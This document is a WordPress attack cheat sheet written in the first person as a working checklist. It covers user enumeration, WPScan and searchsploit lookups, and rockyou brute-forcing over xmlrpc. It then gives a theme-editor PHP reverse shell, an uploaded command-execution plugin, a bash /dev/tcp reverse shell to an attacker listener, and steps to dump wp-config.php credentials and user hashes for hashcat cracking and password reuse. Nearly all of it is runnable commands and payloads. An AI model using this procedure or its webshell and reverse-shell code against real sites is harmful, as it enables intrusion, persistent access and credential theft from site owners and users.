# WordPress

## Is it, and which version
curl -sk <Scheme>://<WebHost>/ | grep -iE 'generator|wp-content'
curl -sk <Scheme>://<WebHost>/feed/ | grep -i generator
- [ ] Links point at a host name: host add, at the pwn-broker prompt, or the site loads half-broken

## Users by hand
curl -sk <Scheme>://<WebHost>/wp-json/wp/v2/users | jq -r '.[].slug'
curl -sk <Scheme>://<WebHost>/wp-sitemap-users-1.xml
curl -skI '<Scheme>://<WebHost>/?author=1' | grep -i location

## WPScan
A free API token from wpscan.com adds the vulnerability data.
wpscan --update
wpscan --url <Scheme>://<WebHost> -e u,vp,vt --api-token THE-API-TOKEN
Every plugin, slow and noisy:
wpscan --url <Scheme>://<WebHost> -e ap --plugins-detection aggressive --api-token THE-API-TOKEN
- [ ] HTTPS with a self-signed certificate: add --disable-tls-checks
- [ ] Each plugin and theme, with its version, through searchsploit
searchsploit wordpress THE-PLUGIN
- [ ] Old plugins are the usual way in: LFI, SQL injection, file upload, unauthenticated settings changes

## Passwords
wpscan --url <Scheme>://<WebHost> -U users.txt -P /usr/share/wordlists/rockyou.txt
- [ ] xmlrpc.php answers: wpscan uses it, which is much faster than the login form
- [ ] Every credential I already hold tried at /wp-login.php first

## Admin to shell: the theme editor
- [ ] Appearance, Theme File Editor (or Tools, Theme File Editor): a PHP file of the active theme, such as 404.php
- [ ] Its contents replaced with /usr/share/webshells/php/php-reverse-shell.php, with $ip and $port set, then Update File
rlwrap nc -lvnp <LPORT>
curl -sk <Scheme>://<WebHost>/wp-content/themes/THE-THEME/404.php

## Admin to shell: a plugin
When the editor is turned off, a plugin of my own, uploaded and not even activated:
cat > rshell.php <<'EOF'
<?php
/*
Plugin Name: rshell
*/
system($_GET["cmd"]);
?>
EOF
zip rshell.zip rshell.php
- [ ] Plugins, Add New, Upload Plugin, rshell.zip, Install Now
curl -sk '<Scheme>://<WebHost>/wp-content/plugins/rshell/rshell.php?cmd=id'
curl -sk -G '<Scheme>://<WebHost>/wp-content/plugins/rshell/rshell.php' --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"

## After the shell
grep -E "DB_(NAME|USER|PASSWORD|HOST)" /var/www/html/wp-config.php
mysql -u '<Username>' -p'<Password>' <Database> -e 'select user_login,user_pass from wp_users'
- [ ] The table prefix from $table_prefix in wp-config.php, when it is not wp_
- [ ] $P$ hashes into hashes.txt, one per line
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
- [ ] The database password tried for the local users, over SSH and with su
